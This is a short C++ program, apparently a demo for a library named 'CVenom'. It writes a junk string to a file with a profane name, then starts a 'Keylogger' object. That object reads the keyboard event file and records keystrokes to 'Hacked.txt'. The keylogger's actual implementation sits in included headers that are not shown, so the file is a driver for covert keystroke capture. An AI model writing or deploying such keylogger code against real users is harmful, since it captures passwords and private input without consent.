#include "../CVenom.h"
#include "../DataTools.h"
#include "../KeyboardTools.h"

int main(int argc, char** argv){

	char* Data=(char*)"MotherFather";
	
	DataTools 	    Disk;
	KeyboardTools   Keylogger;
	
	Disk.FileWrite("motherfucker", Data);
	
	Keylogger.GetEventFile();
	Keylogger.OutputTo("Hacked.txt");
	Keylogger.Run();

}
